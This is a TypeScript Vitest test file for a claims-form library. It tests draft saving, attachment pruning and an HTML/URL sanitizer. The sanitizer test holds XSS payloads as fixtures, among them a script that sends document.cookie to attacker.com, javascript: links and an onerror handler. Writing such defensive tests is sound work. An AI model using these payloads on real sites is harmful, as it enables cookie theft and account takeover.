import { describe, it, expect, vi } from 'vitest';
import {
  MultiStepFormManager,
  DefaultSanitizer,
  type FormSchema,
  type AttachmentPointer,
  type IAttachmentStoragePort,
} from '../../src/index.js';

describe('Hostile Critical Traps & Defenses for Multimedia & Attachments', () => {
  const branchFormSchema: FormSchema = {
    v: '1.0',
    id: 'insurance-claims-wizard',
    tenantId: 'claims-corp',
    title: 'Claim Settlement',
    pages: [
      {
        id: 'step-method',
        title: 'Settlement Method',
        fields: [
          {
            id: 'f-method',
            name: 'settlementMethod',
            type: 'select',
            label: 'Method',
            required: true,
            order: 0,
            options: [
              { label: 'Direct Bank Wire', value: 'wire' },
              { label: 'Mailed Paper Check', value: 'check' },
            ],
          },
        ],
        jumpRules: [
          {
            condition: { field: 'settlementMethod', operator: 'equals', value: 'wire' },
            targetPageId: 'step-wire-upload',
          },
          {
            condition: { field: 'settlementMethod', operator: 'equals', value: 'check' },
            targetPageId: 'step-check-details',
          },
        ],
      },
      {
        id: 'step-wire-upload',
        title: 'Wire Verification',
        fields: [
          {
            id: 'f-proof',
            name: 'bankProof',
            type: 'file',
            label: 'Voided Check / Bank Letter',
            required: true,
            order: 0,
          },
        ],
      },
      {
        id: 'step-check-details',
        title: 'Check Mailing Address',
        fields: [
          {
            id: 'f-address',
            name: 'mailingAddress',
            type: 'text',
            label: 'Address',
            required: true,
            order: 0,
          },
        ],
      },
      {
        id: 'step-review',
        title: 'Final Review',
        fields: [
          {
            id: 'f-confirm',
            name: 'confirmed',
            type: 'text',
            label: 'Confirmation',
            required: true,
            order: 0,
          },
        ],
      },
    ],
  };

  it('Trap 1 Defense (Storage Quota Poisoning): saveDraft strips raw base64 data and preserves clean AttachmentPointer', () => {
    const manager = new MultiStepFormManager(branchFormSchema, () => {});

    // Simulate user selecting wire
    manager.setFieldValue('settlementMethod' as any, 'wire');
    manager.nextStep(); // on step-wire-upload

    // Attaching a valid lightweight AttachmentPointer with extra raw base64 data attached
    const validPointer: AttachmentPointer = {
      id: 'att-101',
      name: 'voided_check.pdf',
      size: 1048576,
      mimeType: 'application/pdf',
      localUri: 'file:///data/user/0/cache/voided_check.pdf',
      remoteUrl: 'https://cdn.example.com/claims/att-101.pdf',
    };

    // User also has a huge raw base64 photo data in an unexpected field
    const hugeBase64 = 'data:image/jpeg;base64,' + 'A'.repeat(50000); // 50KB string
    manager.setFieldValue('bankProof' as any, validPointer);
    manager.setFieldValue('rawImageData' as any, hugeBase64);

    const draft = manager.saveDraft();

    // 1. Raw 50KB base64 is completely purged from serialized draft snapshot
    expect(draft.values.rawImageData).toBeUndefined();

    // 2. AttachmentPointer is preserved cleanly with lightweight URI pointers
    const savedPointer = draft.values.bankProof as AttachmentPointer;
    expect(savedPointer).toBeDefined();
    expect(savedPointer.id).toBe('att-101');
    expect(savedPointer.localUri).toBe('file:///data/user/0/cache/voided_check.pdf');
    expect(savedPointer.size).toBe(1048576);
  });

  it('Trap 4 Defense (Zero-Trust Sanitization): DefaultSanitizer strips scripts, SVG onload, and javascript: links', () => {
    const sanitizer = new DefaultSanitizer();

    // Safe URLs
    expect(sanitizer.sanitizeUrl('https://example.com/form')).toBe('https://example.com/form');
    expect(sanitizer.sanitizeUrl('/terms/privacy')).toBe('/terms/privacy');
    expect(sanitizer.sanitizeUrl('mailto:support@example.com')).toBe('mailto:support@example.com');

    // Hostile URL schemes
    expect(sanitizer.sanitizeUrl('javascript:alert(document.cookie)')).toBe('');
    expect(sanitizer.sanitizeUrl('data:text/html,<script>alert(1)</script>')).toBe('');
    expect(sanitizer.sanitizeUrl('vbscript:msgbox(1)')).toBe('');

    // Hostile rich text / HTML
    const hostileMarkdown = `
# Welcome <script>fetch('http://attacker.com/steal?cookie=' + document.cookie)</script>
Please click [here](javascript:void(document.location='http://evil.com')) for info.
<img src="avatar.jpg" onerror="alert('pwned')" />
<object data="malware.swf"></object>
`;
    const sanitized = sanitizer.sanitizeRichText(hostileMarkdown);
    expect(sanitized).not.toContain('<script>');
    expect(sanitized).not.toContain('fetch(');
    expect(sanitized).not.toContain('javascript:');
    expect(sanitized).not.toContain('onerror=');
    expect(sanitized).not.toContain('<object>');
    expect(sanitized).toContain('# Welcome');

    // Embed URL verification
    expect(sanitizer.isSafeEmbedUrl('https://www.youtube.com/watch?v=dQw4w9WgXcQ')).toBe(true);
    expect(sanitizer.isSafeEmbedUrl('https://www.loom.com/share/abc12345')).toBe(true);
    expect(sanitizer.isSafeEmbedUrl('https://evil-phishing-site.com/video.mp4')).toBe(false);
  });

  it('Trap 5 Defense (Branch Diversion Orphaned File Leaks): triggers onAttachmentPruned and deleteLocal when branch diverts', async () => {
    const deletedFileIds: string[] = [];
    const prunedEventHistory: Array<{ field: string; id: string }> = [];

    const mockAttachmentStorage: IAttachmentStoragePort = {
      storeLocal: vi.fn(),
      deleteLocal: vi.fn(async (id: string) => {
        deletedFileIds.push(id);
      }),
      getLocal: vi.fn(),
    };

    const manager = new MultiStepFormManager(branchFormSchema, () => {}, {
      attachmentStorage: mockAttachmentStorage,
      onAttachmentPruned: (field, pointer) => {
        prunedEventHistory.push({ field, id: pointer.id });
      },
    });

    // Step 1: User selects 'wire'
    manager.setFieldValue('settlementMethod' as any, 'wire');
    manager.nextStep(); // Navigates to step-wire-upload

    // User uploads voided check
    const pointer: AttachmentPointer = {
      id: 'file-doc-999',
      name: 'bank_statement.pdf',
      size: 204800,
      mimeType: 'application/pdf',
      localUri: 'file:///cache/bank_statement.pdf',
    };
    manager.setFieldValue('bankProof' as any, pointer);

    // Step 2: User backtracks to Step 1
    manager.prevStep();

    // Step 3: User changes method from 'wire' to 'check' (branch diversion!)
    manager.setFieldValue('settlementMethod' as any, 'check');
    manager.nextStep(); // Diverts to step-check-details

    // Verification: The orphaned attachment from the abandoned branch was automatically pruned & deleted!
    expect(prunedEventHistory).toContainEqual({ field: 'bankProof', id: 'file-doc-999' });
    expect(deletedFileIds).toContain('file-doc-999');
    expect(mockAttachmentStorage.deleteLocal).toHaveBeenCalledWith('file-doc-999');
  });
});
